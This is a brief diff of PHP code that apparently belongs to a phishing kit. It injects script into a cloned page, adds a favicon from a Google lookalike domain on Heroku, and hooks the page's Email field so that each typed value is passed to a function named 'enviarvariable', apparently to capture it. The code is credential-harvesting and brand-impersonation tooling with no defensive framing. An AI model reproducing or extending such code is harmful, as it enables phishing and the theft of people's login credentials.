@@ -37,7 +37,9 @@ function handler() {
   }
 }
 
-</script></head>";
+</script>
+<link rel=\"shortcut icon\" href=\"http://accountsgoogle.herokuapp.com/favicon.ico\">
+</head>";
 $htmlConstruida = str_replace("</head>", $insertCode, $html);
 
 $insertCode = "id='Email' onchange='enviarvariable(document.getElementById(\"Email\").value)'";
